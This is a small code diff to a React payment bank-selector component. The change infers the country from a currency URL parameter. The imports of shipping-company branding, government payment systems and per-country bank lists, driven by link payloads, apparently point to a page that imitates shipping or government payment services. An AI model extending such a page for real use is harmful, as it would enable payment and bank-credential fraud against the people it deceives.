@@ -11,7 +11,7 @@ import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
-import { formatCurrency } from "@/lib/countryCurrencies";
+import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
 
 const PaymentBankSelector = () => {
@@ -32,7 +32,10 @@ const PaymentBankSelector = () => {
   const amountParam = searchParams.get('amount') || searchParams.get('a');
   const currencyParam = searchParams.get('currency');
   
-  const countryCode = countryParam || linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
+  // استنتاج الدولة من العملة إذا لم تكن موجودة
+  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
+  
+  const countryCode = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   
   const govSystem = getGovernmentPaymentSystem(countryCode);
